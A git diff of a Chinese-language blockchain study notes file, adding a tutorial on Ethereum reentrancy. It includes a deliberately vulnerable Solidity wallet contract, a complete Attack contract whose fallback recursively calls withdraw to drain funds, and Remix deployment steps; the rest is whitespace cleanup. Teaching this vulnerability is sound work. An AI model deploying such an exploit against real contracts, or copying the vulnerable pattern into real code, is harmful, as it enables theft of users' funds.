 {"erro": 0, "address": "0x4aa8abdc9361040689154f28e9fbf6229862d6ca", "hash": "0xd32d279af7b4d4b9f47167caeca0b0c2e8db0698a367aadc6868050251a20e1c"}
 ```
+
+### 以太坊智能合约攻击：重入
+
+#### 公共钱包合约
+
+合约实现了一个类似公共钱包的代码，其中，balances 定义了一个下标为 [address] 的公共钱包，deposit 函数向钱包中调用者的位置存入相应的 value 值，withdraw 函数检查提币账户的余额与该合约资产是否大于参数 amount，之后向 to 地址发送相应 ether。
+
+```javascript
+pragma solidity ^0.4.19;
+
+contract IDMoney{
+    address _owner;
+    mapping (address => uint256) balances;
+
+    function IDMoney() {
+        _owner = msg.sender; // 构造函数中的 msg.sender 只能是创建者
+    }
+    function deposit() public payable {
+        balances[msg.sender] += msg.value;
+    }
+    function withdraw(address to, uint256 amount) public payable {
+        require(balances[msg.sender] >= amount); // 公共钱包中调用者的余额是否足够
+        require(this.balance >= amount); // 该合约资产是否足够
+
+        to.call.value(amount*10**18)(); // 此处 amount 单位是 wei，这里换算成 ether
+        balances[msg.sender] -= amount*10**18;
+    }
+    function balanceof(address to) constant returns(uint256){
+        return balances[to];
+    }
+}
+```
+
+#### 存在的问题
+
+> Solidity 中 <address>.transfer()，<address>.send() 和 <address>.gas().call.vale()() 都可以用于向某一地址发送 ether，他们的区别在于：
+>
+>  <address>.transfer()
+>
+>  * 当发送失败时会 throw; 回滚状态
+>
+>  * 只会传递 2300 Gas 供调用，防止重入（reentrancy）
+>
+> <address>.send()
+>
+>  * 当发送失败时会返回 false 布尔值
+>
+>  * 只会传递 2300 Gas 供调用，防止重入（reentrancy）
+>
+> <address>.gas().call.value()()
+>
+> \* 当发送失败时会返回 false 布尔值
+>
+> \* 传递所有可用 Gas 进行调用（可通过 gas(gas_value) 进行限制），不能有效防止重入（reentrancy）
+
+当外部账户或其他合约向一个合约地址发送 ether 时，会执行该合约的 fallback函数（当调用合约时没有匹配到函数，也会调用没有名字的 fallback 函数）。且 call.value() 会将所有可用 gas 给予外部调用（fallback 函数），若在 fallback 函数中再调用 withdraw 函数，则会导致递归问题。攻击者可以部署一个恶意递归的合约将公共钱包这个合约账户里的 ether 全部提出来。
+
+**前提条件：**
+
+1. call.value() 提供了足够的  gas
+2. 资产的修改在转币之后
+
+#### 攻击合约
+
+```javascript
+pragma solidity ^0.4.19;
+
+contract IDMoney{
+    address _owner;
+    mapping (address => uint256) balances;
+
+    function IDMoney() {
+        _owner = msg.sender;
+    }
+    function deposit() public payable {
+        balances[msg.sender] += msg.value;
+    }
+    function withdraw(address to, uint256 amount) public payable {
+        require(balances[msg.sender] >= amount);
+        require(this.balance >= amount);
+
+        to.call.value(amount)();
+        balances[msg.sender] -= amount;
+    }
+    function balanceof(address to) constant returns(uint256){
+        return balances[to];
+    }
+}
+
+contract Attack {
+    address owner;
+    address victim;
+
+    modifier ownerOnly { require(owner == msg.sender); _; }
+
+    function Attack() payable { owner = msg.sender; }
+
+    // 设置已部署的 IDMoney 合约实例地址
+    function setVictim(address target) ownerOnly { victim = target; }
+
+    // deposit Ether to IDMoney deployed
+    function step1(uint256 amount) ownerOnly payable {
+        if (this.balance > amount) {
+            victim.call.value(amount)(bytes4(keccak256("deposit()")));
+        }
+    }
+    // withdraw Ether from IDMoney deployed
+    function step2(uint256 amount) ownerOnly {
+        victim.call(bytes4(keccak256("withdraw(address,uint256)")), this, amount);
+    }
+    // selfdestruct, send all balance to owner
+    function stopAttack() ownerOnly {
+        selfdestruct(owner);
+    }
+
+    function startAttack(uint256 amount) ownerOnly {
+        step1(amount);
+        step2(amount / 2);
+    }
+
+    function () payable {
+        if (msg.sender == victim) {
+            // 再次尝试调用 IDMoney 的 withdraw 函数，递归转币
+            victim.call(bytes4(keccak256("withdraw(address,uint256)")), this, msg.value);
+        }
+    }
+}
+```
+
+#### 攻击过程
+
+在 `https://remix.ethereum.org` 编译合约之后，先部署 `IDMoney`
+
+![](pic/blockchain/compile_idmoney.png)
+
+得到 `IDMoney` 合约地址 `0xef55bfac4228981e850936aaf042951f7b146e41`
+
+![](pic/blockchain/compile_idmoney2.png)
+
+向外部账户 `0xca35b7d915458ef540ade6068dfe2f44e8fa733c` 向钱包存入 20 个以太坊，如下所示
+
+![](pic/blockchain/deposit_idmoney.png)
+
+点击 `deposit` 之后，查看交易信息
+
+![](pic/blockchain/deposit_idmoney2.png)
+
+查看外部账户 `0xca35b7d915458ef540ade6068dfe2f44e8fa733c` 信息，合约中的余额为 20（0 --> 20），同时，账户余额为 79 （99 --> 79）
+
+![](pic/blockchain/balanceof_idmoney.png)
+
+可以正常地对外部账户 `0xca35b7d915458ef540ade6068dfe2f44e8fa733c` 进行取现
+
+![1533885926602](pic/blockchain/withdraw_idmoney.png)
+
+查看交易详细信息
+
+![1533886029601](pic/blockchain/withdraw_idmoney2.png)
+
+再次查看外部账户 `0xca35b7d915458ef540ade6068dfe2f44e8fa733c`，可以看到合约中的余额为 0
+
+![](pic/blockchain/balanceof_idmoney2.png)
+
+**WARNING: 切换到外部账户 `0x4b0897b0513fdc7c541b6d9d7e929c4e5364d2db ` 之后，才能部署合约 `Attack`**
+
+部署合约 `Attack`
+
+![](pic/blockchain/deploy_attack.png)
+
+得到 `Attack` 合约地址 `0x5559291517fd70189de6e56c0f0e97917c9c4cb6 `
+
+![](pic/blockchain/deploy_attack2.png)
+
+调用 `setVictim` 设置合约 `IDMoney` 地址，如下所示
+
+![](pic/blockchain/set_victim_attack.png)
+
+![](pic/blockchain/set_victim_attack2.png)
+
+向外部账户 `0xca35b7d915458ef540ade6068dfe2f44e8fa733c` 向钱包存入 22 个以太坊，然后外部账户 尝试`0x4b0897b0513fdc7c541b6d9d7e929c4e5364d2db` 发动攻击，调用 `Attack` 合约中的 `startAttack(10)`，即，外部账户 `0x4b0897b0513fdc7c541b6d9d7e929c4e5364d2db` 先向钱包转入 10 个以太坊，然后提取 5 个以太坊
+
+![](pic/blockchain/start_attack.png)
+
+![1533892799794](pic/blockchain/start_attack2.png)
+
+
 
 ## 比特币 bitcoin
 
@@ -1954,28 +2140,28 @@ root@ubuntu:~/wikichain/tmp/node1# ./node1 -datadir=. getbalance wKkoeBCynvuDmkS
 
 ```bash
 root@ubuntu:~/wikichain/tmp/node1# echo -n "whmD4M8Q8qbEx6R5gULbcb5ZkedbcRDGY1"|xxd -p
-77686d44344d3851387162457836523567554c626362355a6b656462635244475931 
+77686d44344d3851387162457836523567554c626362355a6b656462635244475931
 ```
 
 
 
-充值总金额（10000000000）=> 
+充值总金额（10000000000）=>
 
 利用计算器转成 16 进制为 2540be400，补齐 8 字节后为 00000002540be400，按照内存中逆序后为00e40b5402000000
 
- 
+
 
 自由金额（500000000）=>
 
 利用计算器转成 16 进制为 1dcd6500，补齐 8 字节后为 000000001dcd6500，按照内存中逆序后为0065cd1d00000000
 
- 
+
 
 每月冻结金额（500000000）=>
 
 利用计算器转成 16 进制为 1dcd6500，补齐 8 字节后为 000000001dcd6500，按照内存中逆序后为0065cd1d00000000
 
- 
+
 
 将这些字段组合在一起，形成合约内容：
 
@@ -2113,11 +2299,11 @@ root@ubuntu:~/wikichain/tmp/node1# ./node1 -datadir=. getbalance whmD4M8Q8qbEx6R
 
 将自由金额（5个币），提现到地址 whmD4M8Q8qbEx6R5gULbcb5ZkedbcRDGY1
 
- 
+
 
 合约内容 = 前缀 1 字节（0xff）+ 操作类型 1 字节（0x01）+ 账户类型 1 字节（0x02）+ 提现金额 8 字节（500000000）
 
- 
+
 
 将合约内容转换成16进制字符串
 
@@ -2131,7 +2317,7 @@ root@ubuntu:~/wikichain/tmp/node1# ./node1 -datadir=. getbalance whmD4M8Q8qbEx6R
 
 利用计算器转成 16 进制为1dcd6500，补齐 8 字节后为 000000001dcd6500，按照内存中逆序后为0065cd1d00000000
 
- 
+
 
 将这些字段组合在一起，形成合约内容：
 
@@ -2191,7 +2377,7 @@ error: {"code":-4,"message":"Error:run-script-error:luaL_loadbuffer fail:[string
 
 #### 编程语言：Solidity
 
-> 智能合约编程语言有 Viper，Serpent，LLL 及 Bamboo，建议大家还是使用 Solidity。Serpent 官方已经不再推荐，建议 Serpent 的用户转换到 Viper，他们都是类 Python 语言。 
+> 智能合约编程语言有 Viper，Serpent，LLL 及 Bamboo，建议大家还是使用 Solidity。Serpent 官方已经不再推荐，建议 Serpent 的用户转换到 Viper，他们都是类 Python 语言。
 
 智能合约的官方推荐的编程语言是 Solidity，文件扩展名以 .sol 结尾。
 Solidity 语言和 JavaScript 很相似，用它来开发合约并编译成以太坊虚拟机字节代码。
@@ -2363,7 +2549,7 @@ Hyperledger Fabric 提供了建立 **channel** 的功能，这允许参与者为
 
 因此，我建议将联盟链置于用户数据和公有链之间。如下图所示，是保全网的方案，采用了 Factom 的技术，而联盟链公司可以将中间的锚定链替换为自身的联盟链，从而提高用户存证的确认速度，并且多个数据最终做一次哈希，可大大降低比特币网络的交易次数，从而降低成本。
 
-![img](pic/blockchain/deposit.png) 
+![img](pic/blockchain/deposit.png)
 
 **联盟链的作用和公有链的作用**
 
@@ -2413,7 +2599,7 @@ RETURN 常为一个金额为 0 的比特币输出， 因为任何与该输出相
 
 **举例**
 
-> [交易 0xb17a027a8f7ae0db4ddbaa58927d0f254e97fce63b7e57e8e50957d3dad2e66e](https://www.blockchain.com/btc/tx/b17a027a8f7ae0db4ddbaa58927d0f254e97fce63b7e57e8e50957d3dad2e66e) 
+> [交易 0xb17a027a8f7ae0db4ddbaa58927d0f254e97fce63b7e57e8e50957d3dad2e66e](https://www.blockchain.com/btc/tx/b17a027a8f7ae0db4ddbaa58927d0f254e97fce63b7e57e8e50957d3dad2e66e)
 >
 > [交易 0xe89e09ac184e1a175ce748775b3e63686cb1e5fe948365236aac3b3aef3fedd0](https://www.blockchain.com/btc/tx/e89e09ac184e1a175ce748775b3e63686cb1e5fe948365236aac3b3aef3fedd0)
 
